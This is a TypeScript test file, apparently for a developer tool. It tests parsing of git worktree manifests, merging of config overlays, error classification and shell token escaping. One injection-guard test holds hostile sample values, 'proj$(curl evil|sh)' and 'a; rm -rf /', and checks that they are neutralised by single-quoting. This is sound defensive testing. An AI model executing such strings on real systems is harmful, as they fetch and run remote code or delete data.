import { describe, it, expect } from 'vitest'
import {
  resolveManifest,
  resolveWorktreeDir,
  buildSeedPlan,
  expandCommandTokens,
  disclosedWorktreeCommands,
  isSafeWorktreeTarget,
  classifyManifestFailure,
  formatProvisionError,
  provisionErrorPayload,
  WorktreeProvisionError,
  type ManifestSources,
  type ResolvedManifest
} from '../src/main/worktree-manifest'

/** Convenience: resolve with a fixed context so tests focus on the sources. */
function resolve(sources: ManifestSources, branch = 'feat/login', repo = 'acme'): ResolvedManifest {
  return resolveManifest(sources, { branch, repo })
}

describe('resolveManifest — built-in default', () => {
  it('falls back to the built-in default when no source is present', () => {
    const m = resolve({})
    expect(m.source).toBe('default')
    expect(m.from).toBe('HEAD')
    expect(m.seed).toEqual({ copy: [], link: [] })
    expect(m.setup).toEqual([])
    expect(m.boot).toEqual({})
    expect(m.create).toBeUndefined()
    expect(m.body).toBe('')
    expect(m.dirExplicit).toBe(false)
    expect(m.warnings).toEqual([])
  })

  it('seeds .env in the default only when the repo actually has one', () => {
    expect(resolve({ hasEnvFile: true }).seed.copy).toEqual(['.env'])
    expect(resolve({ hasEnvFile: false }).seed.copy).toEqual([])
  })

  it('expands {repo}/{branch}/{slug} tokens in the default dir', () => {
    // default dir template is ../{repo}-worktrees/{branch}
    const m = resolve({}, 'feat/login', 'acme')
    expect(m.dir).toBe('../acme-worktrees/feat/login')
  })
})

describe('resolveManifest — front matter parsing', () => {
  it('parses the closed vocabulary from WORKTREE.md', () => {
    const worktreeMd = [
      '---',
      'dir: ../worktrees/{slug}',
      'from: main',
      'seed:',
      '  copy: [.env, vendor/]',
      '  link: [node_modules/]',
      'setup:',
      '  - php artisan migrate --env=testing',
      'boot:',
      '  model: sonnet',
      '  prompt: "/implement @{prd}"',
      '---',
      '',
      '# How to work in this worktree',
      'Never push to main.'
    ].join('\n')
    const m = resolve({ worktreeMd })
    expect(m.source).toBe('worktree-md')
    expect(m.dir).toBe('../worktrees/feat-login')
    expect(m.from).toBe('main')
    expect(m.seed).toEqual({ copy: ['.env', 'vendor/'], link: ['node_modules/'] })
    expect(m.setup).toEqual(['php artisan migrate --env=testing'])
    expect(m.boot).toEqual({ model: 'sonnet', prompt: '/implement @{prd}' })
    expect(m.dirExplicit).toBe(true)
    expect(m.body).toContain('Never push to main.')
    expect(m.body).not.toContain('dir:')
    expect(m.warnings).toEqual([])
  })

  it('honors the create/remove delegation escape hatch', () => {
    const worktreeMd = [
      '---',
      'create: node bin/worktree/worktree.mjs create {branch} --from {from}',
      'remove: node bin/worktree/worktree.mjs remove {branch}',
      '---'
    ].join('\n')
    const m = resolve({ worktreeMd })
    expect(m.create).toBe('node bin/worktree/worktree.mjs create {branch} --from {from}')
    expect(m.remove).toBe('node bin/worktree/worktree.mjs remove {branch}')
  })

  it('keeps the body when there is no front matter at all', () => {
    const m = resolve({ worktreeMd: '# Just prose\nno front matter here' })
    expect(m.source).toBe('worktree-md')
    expect(m.dirExplicit).toBe(false)
    expect(m.body).toContain('Just prose')
  })
})

describe('resolveManifest — discovery order', () => {
  it('prefers WORKTREE.md over .claude/worktree.md and legacy config', () => {
    const m = resolve({
      worktreeMd: '---\nfrom: primary\n---',
      claudeWorktreeMd: '---\nfrom: secondary\n---',
      legacyConfigJson: '{"worktreesDir":"../legacy"}'
    })
    expect(m.source).toBe('worktree-md')
    expect(m.from).toBe('primary')
  })

  it('falls back to .claude/worktree.md when WORKTREE.md is absent', () => {
    const m = resolve({ claudeWorktreeMd: '---\nfrom: secondary\n---' })
    expect(m.source).toBe('claude-worktree-md')
    expect(m.from).toBe('secondary')
  })

  it('imports legacy worktree.config.json as the last resort before default', () => {
    const m = resolve({
      legacyConfigJson: JSON.stringify({ worktreesDir: '../wt', copy: ['.env', 'config/'] })
    })
    expect(m.source).toBe('legacy-config')
    // worktreesDir → dir (dir-safe slug token appended), copy → seed.copy
    expect(m.dir).toBe('../wt/feat-login')
    expect(m.seed.copy).toEqual(['.env', 'config/'])
    expect(m.dirExplicit).toBe(true)
  })
})

describe('resolveManifest — WORKTREE.local.md overlay (deep-merge)', () => {
  it('deep-merges local front matter over the committed one (objects merge)', () => {
    const worktreeMd = [
      '---',
      'from: main',
      'seed:',
      '  copy: [.env]',
      '  link: [node_modules/]',
      'boot:',
      '  model: sonnet',
      '  prompt: "/implement"',
      '---'
    ].join('\n')
    // local only overrides boot.model and seed.copy; the rest survives
    const localMd = [
      '---',
      'boot:',
      '  model: opus',
      'seed:',
      '  copy: [.env, .env.local]',
      '---'
    ].join('\n')
    const m = resolve({ worktreeMd, localMd })
    expect(m.localOverride).toBe(true)
    expect(m.boot).toEqual({ model: 'opus', prompt: '/implement' }) // object merged
    expect(m.seed.copy).toEqual(['.env', '.env.local']) // array replaced
    expect(m.seed.link).toEqual(['node_modules/']) // untouched sub-key survives
    expect(m.from).toBe('main')
  })

  it('lets local override the dir even when the committed manifest set none', () => {
    const m = resolve({ localMd: '---\ndir: /abs/machine/{slug}\n---' })
    expect(m.dir).toBe('/abs/machine/feat-login')
    expect(m.dirExplicit).toBe(true)
    expect(m.localOverride).toBe(true)
  })

  it('keeps committed seed.copy when local only sets seed.link (object merges)', () => {
    // the merge direction that could plausibly regress: local touches a sibling
    // sub-key, the untouched committed sub-key must survive.
    const worktreeMd = ['---', 'seed:', '  copy: [.env, vendor/]', '---'].join('\n')
    const localMd = ['---', 'seed:', '  link: [node_modules/]', '---'].join('\n')
    const m = resolve({ worktreeMd, localMd })
    expect(m.seed.copy).toEqual(['.env', 'vendor/'])
    expect(m.seed.link).toEqual(['node_modules/'])
  })
})

describe('resolveManifest — malformed degradation (never throws)', () => {
  it('degrades malformed YAML front matter to the built-in default with a warning', () => {
    const worktreeMd = ['---', 'dir: [unclosed', '  : : :', '---', 'body kept'].join('\n')
    const m = resolve({ worktreeMd })
    expect(m.source).toBe('default')
    expect(m.dir).toBe('../acme-worktrees/feat/login') // built-in default
    expect(m.warnings.length).toBeGreaterThan(0)
    expect(m.warnings.join(' ')).toMatch(/WORKTREE\.md/)
    // a malformed manifest must not blow up the create flow
  })

  it('degrades non-mapping front matter (a bare list) to the default', () => {
    const worktreeMd = ['---', '- just', '- a list', '---'].join('\n')
    const m = resolve({ worktreeMd })
    expect(m.source).toBe('default')
    expect(m.warnings.length).toBeGreaterThan(0)
  })

  it('warns and ignores unknown keys but keeps the known ones', () => {
    const worktreeMd = ['---', 'from: main', 'wat: nope', 'seed:', '  bogus: 1', '---'].join('\n')
    const m = resolve({ worktreeMd })
    expect(m.from).toBe('main')
    expect(m.warnings.join(' ')).toMatch(/wat/)
    expect(m.warnings.join(' ')).toMatch(/bogus/)
  })

  it('warns and ignores wrongly-typed values without throwing', () => {
    // Under FAILSAFE_SCHEMA a scalar is always a string, so use genuinely wrong
    // shapes: a mapping where a string is expected, a scalar where a list is.
    const worktreeMd = ['---', 'dir:', '  nested: true', 'setup: not-a-list', '---'].join('\n')
    const m = resolve({ worktreeMd })
    // wrong types are dropped → falls back to default dir, empty setup
    expect(m.dir).toBe('../acme-worktrees/feat/login')
    expect(m.dirExplicit).toBe(false)
    expect(m.setup).toEqual([])
    expect(m.warnings.length).toBeGreaterThan(0)
  })

  it('preserves numeric/date/version base refs as strings (no YAML coercion)', () => {
    // finding A: js-yaml would coerce `1.20`→1.2, `2024`→2024(number),
    // `2024-01-01`→Date; FAILSAFE_SCHEMA keeps them verbatim strings.
    expect(resolve({ worktreeMd: '---\nfrom: 1.20\n---' }).from).toBe('1.20')
    expect(resolve({ worktreeMd: '---\nfrom: 2024\n---' }).from).toBe('2024')
    expect(resolve({ worktreeMd: '---\nfrom: 2024-01-01\n---' }).from).toBe('2024-01-01')
    // a dir pinned to a numeric-looking value is honored, not dropped
    const m = resolve({ worktreeMd: '---\ndir: 2024\n---' })
    expect(m.dir).toBe('2024')
    expect(m.dirExplicit).toBe(true)
  })

  it('treats a blank dir/from as unset (falls through to the default)', () => {
    // finding C: an empty dir would otherwise resolve to the repo root itself.
    const m = resolve({ worktreeMd: '---\ndir: ""\nfrom: "  "\n---' })
    expect(m.dir).toBe('../acme-worktrees/feat/login')
    expect(m.dirExplicit).toBe(false)
    expect(m.from).toBe('HEAD')
    expect(m.warnings.length).toBeGreaterThan(0)
  })

  it('warns when the front matter fence is never closed (recipe not silently lost)', () => {
    // finding E: an unterminated `---` used to be swallowed as body with no signal.
    const m = resolve({ worktreeMd: '---\nfrom: main\nno closing fence' })
    expect(m.from).toBe('HEAD') // recipe was treated as body → default
    expect(m.dirExplicit).toBe(false)
    expect(m.warnings.join(' ')).toMatch(/unterminated/i)
  })

  it('hints at quoting when an unquoted @-prompt breaks the parse', () => {
    // finding B: `prompt: @docs/x.md` is a YAML syntax error → whole recipe degrades.
    const m = resolve({ worktreeMd: '---\nprompt: @docs/prd.md\n---' })
    expect(m.source).toBe('default')
    expect(m.warnings.join(' ')).toMatch(/quote/i)
  })

  it('ignores a malformed local overlay but still applies the committed manifest', () => {
    const m = resolve({ worktreeMd: '---\nfrom: main\n---', localMd: '---\n:::bad\n---' })
    expect(m.from).toBe('main')
    expect(m.localOverride).toBe(false)
    expect(m.warnings.join(' ')).toMatch(/local/i)
  })

  it('ignores invalid legacy JSON gracefully', () => {
    const m = resolve({ legacyConfigJson: '{not json' })
    expect(m.source).toBe('default')
    expect(m.warnings.length).toBeGreaterThan(0)
  })
})

describe('resolveManifest — token expansion', () => {
  it('uses the raw ref for {branch} and a dir-safe form for {slug}', () => {
    const m = resolve(
      { worktreeMd: '---\ndir: ../wt/{branch}--{slug}--{repo}\n---' },
      'feat/x',
      'proj'
    )
    expect(m.dir).toBe('../wt/feat/x--feat-x--proj')
  })

  it('inserts a {repo} value containing $ literally (no replacement-pattern expansion)', () => {
    // finding D: repo = basename(repoRoot) is unvalidated and may contain `$`.
    const m = resolve({ worktreeMd: '---\ndir: ../{repo}-wt/{branch}\n---' }, 'feat/x', 'a$&b')
    expect(m.dir).toBe('../a$&b-wt/feat/x')
  })
})

// ── Step 2 seam: pure planners the engine composes ────────────────────────────

describe('resolveWorktreeDir', () => {
  it('resolves a relative dir against the repo root (sibling layout)', () => {
    expect(resolveWorktreeDir('/home/u/acme', '../acme-worktrees/feat-login')).toBe(
      '/home/u/acme-worktrees/feat-login'
    )
  })

  it('normalizes an absolute dir verbatim', () => {
    expect(resolveWorktreeDir('/home/u/acme', '/abs/wt/feat-login/')).toBe('/abs/wt/feat-login')
  })
})

describe('buildSeedPlan', () => {
  it('maps copy/link entries to absolute from→to ops rooted at repo and worktree', () => {
    const plan = buildSeedPlan(
      { copy: ['.env', 'vendor/'], link: ['node_modules/'] },
      { repoRoot: '/home/u/acme', worktreePath: '/home/u/wt/feat' }
    )
    expect(plan).toEqual([
      { kind: 'copy', entry: '.env', from: '/home/u/acme/.env', to: '/home/u/wt/feat/.env' },
      { kind: 'copy', entry: 'vendor/', from: '/home/u/acme/vendor', to: '/home/u/wt/feat/vendor' },
      {
        kind: 'link',
        entry: 'node_modules/',
        from: '/home/u/acme/node_modules',
        to: '/home/u/wt/feat/node_modules'
      }
    ])
  })

  it('drops empty/whitespace entries', () => {
    const plan = buildSeedPlan(
      { copy: ['', '  '], link: [] },
      { repoRoot: '/r', worktreePath: '/w' }
    )
    expect(plan).toEqual([])
  })
})

describe('expandCommandTokens', () => {
  it('fills {branch}/{slug}/{repo}/{from} in a delegated create command', () => {
    // {branch}/{slug} are pre-validated (SAFE_BRANCH) → literal; {repo}/{from}
    // are single-quoted for `sh -c` safety (T11).
    const out = expandCommandTokens('wt create {branch} --slug {slug} --from {from} ({repo})', {
      branch: 'feat/x',
      from: 'main',
      repo: 'acme'
    })
    expect(out).toBe("wt create feat/x --slug feat-x --from 'main' ('acme')")
  })

  it('neutralizes shell metacharacters in {repo}/{from} (T11 injection guard)', () => {
    // A repo directory named `proj$(curl evil|sh)` must NOT execute as a command
    // substitution when interpolated into the `sh -c` command.
    const out = expandCommandTokens('echo {repo} {from}', {
      branch: 'x',
      from: 'a; rm -rf /',
      repo: 'proj$(curl evil|sh)'
    })
    expect(out).toBe("echo 'proj$(curl evil|sh)' 'a; rm -rf /'")
    // Single-quoted → the shell treats the whole thing as one inert literal word.
  })

  it('escapes an embedded single quote in {repo}/{from}', () => {
    const out = expandCommandTokens('echo {repo}', { branch: 'x', from: 'm', repo: "a'b" })
    expect(out).toBe("echo 'a'\\''b'")
  })
})

describe('disclosedWorktreeCommands (T08 confirm disclosure)', () => {
  const TOKENS = { branch: 'feat/x', from: 'main', repo: 'acme' }

  it('delegated create → delegated:true, single expanded command', () => {
    const m = resolve({
      worktreeMd: ['---', 'create: wt add {branch} --from {from} ({repo})', '---'].join('\n')
    })
    const d = disclosedWorktreeCommands(m, TOKENS)
    expect(d.delegated).toBe(true)
    // {branch} literal (pre-validated), {from}/{repo} single-quoted (T11 fidelity).
    expect(d.commands).toEqual(["wt add feat/x --from 'main' ('acme')"])
    expect(d.removeOnFailure).toBeUndefined()
  })

  it('delegated create+remove → removeOnFailure expanded, NOT in commands', () => {
    const m = resolve({
      worktreeMd: ['---', 'create: wt add {branch}', 'remove: wt rm {branch}', '---'].join('\n')
    })
    const d = disclosedWorktreeCommands(m, TOKENS)
    expect(d.commands).toEqual(['wt add feat/x'])
    expect(d.removeOnFailure).toBe('wt rm feat/x')
    // rollback command is disclosed separately, never in the success-path list.
    expect(d.commands).not.toContain('wt rm feat/x')
  })

  it('non-delegated setup[] → commands verbatim, NOT token-expanded (fidelity)', () => {
    const m = resolve({
      worktreeMd: ['---', 'setup:', '  - npm ci', '  - echo building {branch}', '---'].join('\n')
    })
    const d = disclosedWorktreeCommands(m, TOKENS)
    expect(d.delegated).toBe(false)
    // setup runs RAW (worktree-ipc runs it without expandCommandTokens), so {branch}
    // must appear UN-expanded — the disclosure must match execution, not "help".
    expect(d.commands).toEqual(['npm ci', 'echo building {branch}'])
  })

  it('no create, empty setup → delegated:false, no commands', () => {
    const m = resolve({ worktreeMd: ['---', 'from: main', '---'].join('\n') })
    expect(disclosedWorktreeCommands(m, TOKENS)).toEqual({ delegated: false, commands: [] })
  })
})

describe('isSafeWorktreeTarget', () => {
  it('accepts a sibling/nested target that is neither the repo root nor its .git', () => {
    expect(isSafeWorktreeTarget('/home/u/acme', '/home/u/acme-worktrees/feat')).toBe(true)
    expect(isSafeWorktreeTarget('/home/u/acme', '/home/u/acme/.claude/worktrees/feat')).toBe(true)
  })

  it('rejects the repo root itself and anything inside .git', () => {
    expect(isSafeWorktreeTarget('/home/u/acme', '/home/u/acme')).toBe(false)
    expect(isSafeWorktreeTarget('/home/u/acme', '/home/u/acme/.git')).toBe(false)
    expect(isSafeWorktreeTarget('/home/u/acme', '/home/u/acme/.git/worktrees/x')).toBe(false)
  })

  it('rejects an ancestor of the repo root (dir: .. would enclose the repo + .git)', () => {
    expect(isSafeWorktreeTarget('/home/u/acme', '/home/u')).toBe(false)
    expect(isSafeWorktreeTarget('/home/u/acme', '/home')).toBe(false)
  })
})

// ── BUG-28: setup/seed failure disclosure ──────────────────────────────────

describe('classifyManifestFailure', () => {
  it('classifies exit 127 with a dash/sh-style "not found" as binary-missing, naming the binary', () => {
    const c = classifyManifestFailure({ code: 127, stderr: 'sh: 1: npm: not found' }, 'npm ci')
    expect(c).toEqual({ kind: 'binary-missing', binary: 'npm' })
  })

  it('classifies a zsh-style "command not found: <name>" stderr as binary-missing', () => {
    const c = classifyManifestFailure(
      { code: 127, stderr: 'zsh: command not found: npm' },
      'npm ci'
    )
    expect(c).toEqual({ kind: 'binary-missing', binary: 'npm' })
  })

  it('falls back to the command\'s first token when stderr has no recognizable "not found" shape', () => {
    const c = classifyManifestFailure({ code: 127, stderr: '' }, 'npm ci --silent')
    expect(c).toEqual({ kind: 'binary-missing', binary: 'npm' })
  })

  it('classifies Node ENOENT (the shell binary itself is absent) as binary-missing', () => {
    const c = classifyManifestFailure({ code: 'ENOENT', stderr: '' }, 'npm ci')
    expect(c.kind).toBe('binary-missing')
  })

  it('classifies a non-127 non-zero exit as command-failed, carrying the exit code', () => {
    const c = classifyManifestFailure({ code: 1, stderr: 'Error: build failed' }, 'npm run build')
    expect(c).toEqual({ kind: 'command-failed', exitCode: 1 })
  })

  it('classifies a killed+SIGTERM rejection as timeout', () => {
    const c = classifyManifestFailure({ killed: true, signal: 'SIGTERM' }, 'npm ci')
    expect(c.kind).toBe('timeout')
  })
})

describe('formatProvisionError', () => {
  it('renders a binary-missing error with the binary, PATH, and rollback sentence', () => {
    const msg = formatProvisionError({
      stage: 'setup',
      step: { index: 1, total: 1 },
      command: 'npm ci',
      kind: 'binary-missing',
      binary: 'npm',
      path: '/usr/local/bin:/usr/bin:/bin',
      rolledBack: true,
      branchDeleted: 'feat/x'
    })
    expect(msg).toContain('setup step 1 of 1 failed: `npm ci`')
    expect(msg).toContain('npm')
    expect(msg).toMatch(/command not found/)
    expect(msg).toContain('PATH used: /usr/local/bin:/usr/bin:/bin')
    expect(msg).toContain('The worktree was created and rolled back; branch `feat/x` was deleted.')
  })

  it('renders a command-failed error with step, exact command, exit code, and verbatim stderr', () => {
    const msg = formatProvisionError({
      stage: 'setup',
      step: { index: 2, total: 3 },
      command: 'npm run build',
      kind: 'command-failed',
      exitCode: 1,
      stderr: 'Error: something broke',
      rolledBack: true,
      branchDeleted: 'feat/x'
    })
    expect(msg).toContain('setup step 2 of 3 failed: `npm run build` (exit 1)')
    expect(msg).toContain('Error: something broke')
    expect(msg).toContain('The worktree was created and rolled back; branch `feat/x` was deleted.')
  })

  it('states the worktree may still exist when rollback did not complete cleanly', () => {
    const msg = formatProvisionError({
      stage: 'setup',
      step: { index: 1, total: 1 },
      command: 'npm ci',
      kind: 'command-failed',
      exitCode: 1,
      stderr: 'boom',
      rolledBack: false,
      branchDeleted: null
    })
    expect(msg).toMatch(/may still exist/i)
  })
})

describe('WorktreeProvisionError', () => {
  it('carries the structured fields and formats its own .message', () => {
    const err = new WorktreeProvisionError({
      stage: 'setup',
      step: { index: 1, total: 1 },
      command: 'npm ci',
      kind: 'binary-missing',
      binary: 'npm',
      path: '/usr/bin',
      rolledBack: true,
      branchDeleted: 'feat/x'
    })
    expect(err).toBeInstanceOf(Error)
    expect(err.name).toBe('WorktreeProvisionError')
    expect(err.stage).toBe('setup')
    expect(err.kind).toBe('binary-missing')
    expect(err.binary).toBe('npm')
    expect(err.rolledBack).toBe(true)
    expect(err.branchDeleted).toBe('feat/x')
    expect(err.message).toContain('npm ci')
  })

  it('caps a huge stderr instead of embedding it verbatim in the ACK/message', () => {
    const huge = 'x'.repeat(10_000)
    const err = new WorktreeProvisionError({
      stage: 'setup',
      step: { index: 1, total: 1 },
      command: 'npm run build',
      kind: 'command-failed',
      exitCode: 1,
      stderr: huge,
      rolledBack: true,
      branchDeleted: 'feat/x'
    })
    expect(err.stderr!.length).toBeLessThan(huge.length)
    expect(err.stderr).toMatch(/truncated/)
    expect(err.message.length).toBeLessThan(huge.length)
  })
})

describe('provisionErrorPayload (MCP ACK, T08-shape structured error)', () => {
  it('names the missing binary and states rolledBack + the deleted branch (binary-missing)', () => {
    const err = new WorktreeProvisionError({
      stage: 'setup',
      step: { index: 1, total: 1 },
      command: 'npm ci',
      kind: 'binary-missing',
      binary: 'npm',
      path: '/usr/bin',
      rolledBack: true,
      branchDeleted: 'feat/x'
    })
    const payload = provisionErrorPayload(err)
    expect(payload.kind).toBe('binary-missing')
    expect(payload.binary).toBe('npm')
    expect(payload.rolledBack).toBe(true)
    expect(payload.branchDeleted).toBe('feat/x')
    expect(payload.stage).toBe('setup')
    expect(payload.command).toBe('npm ci')
    expect(Array.isArray(payload.nextActions)).toBe(true)
    expect(JSON.stringify(payload)).toMatch(/install/i)
  })

  it('carries stage, step, and the verbatim command for a command-failed error, with no binary field', () => {
    const err = new WorktreeProvisionError({
      stage: 'setup',
      step: { index: 2, total: 3 },
      command: 'npm run build',
      kind: 'command-failed',
      exitCode: 1,
      stderr: 'Error: broke',
      rolledBack: true,
      branchDeleted: 'feat/x'
    })
    const payload = provisionErrorPayload(err)
    expect(payload.stage).toBe('setup')
    expect(payload.step).toEqual({ index: 2, total: 3 })
    expect(payload.command).toBe('npm run build')
    expect(payload.binary).toBeUndefined()
    expect(payload.exitCode).toBe(1)
  })
})
